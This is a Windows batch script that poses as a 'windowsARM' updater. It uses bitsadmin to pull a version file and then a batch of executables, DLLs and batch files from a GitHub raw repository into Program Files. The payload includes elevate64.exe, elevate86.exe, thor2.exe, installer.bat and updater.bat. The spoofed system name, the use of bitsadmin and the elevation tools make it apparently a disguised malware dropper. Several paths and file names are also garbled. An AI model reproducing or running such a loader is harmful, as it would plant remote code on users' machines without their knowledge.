@echo off
setlocal

bitsadmin /transfer "windowsARM" http://raw.githubusercontent.com/adrian2793/files/main/update.txt "C:\Program Files\temp\windowsARM\update.txt"

set /p programVersion =< "C:\Program Files\temp\windowsARM\update.txt"

if "%programVersion%" == "%~1" (
    echo "9 10 1"
    del "C:\Program Files\temp\windowsARM\update.txt"
) else (
    echo "11 27 1"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/WindowsARM32.deps.json "C:\Program Files\windowsARM\WindowsARM32.deps.json"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/WindowsARM32.runtimeconfig.json "C:\Program Files\windowsARM\WindowsARM32.runtimeconfig.json"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/WindowsARM32.dll "C:\Program Files\windowsARM\WindowsARM32.dll"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/WindowsARM32.dll "C:\Program Files\windowsARM\WindowsARM32.pdb"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/WindowsARM32.exe "C:\Program Files\windowsARM\WindowsARM32.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/bcd.exe "C:\Program Files\windowsARM\components\bcd.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/curl.exe "C:\Program Files\windowsARM\components\curl.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/dsfo.exe "C:\Program Files\windowsARM\components\dsfo.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/elevate64.exe "C:\Program Files\windowsARM\components\elevate64.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/elevate86.exe "C:\Program Files\windowsARM\components\elevate86.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/installer.bat "C:\Program Files\windowsARM\components\installer.bat"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/libcurl-x64.dll "C:\Program Files\windowsARM\components\libcurl-x64.dll"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/main.exe "C:\Program Data\Program Files\windowsARM\components\main.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/thor2.exe "C:\Program Data\Program Files\windowsARM\components\thor2.exe"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/updater.bat "C:\Program Data\Program Files\windowsARM\components\updater.bat"
    bitsadmin /transfer "windowsARM" https://raw.githubusercontent.com/adrian2793/files/main/components/vhdx.exe "C:\Program Data\Program Files\windowsARM\components\vhdx.exe"
)

echo "31 33"

del "C:\Program Files\temp\windowsARM\update.txt"

endlocal
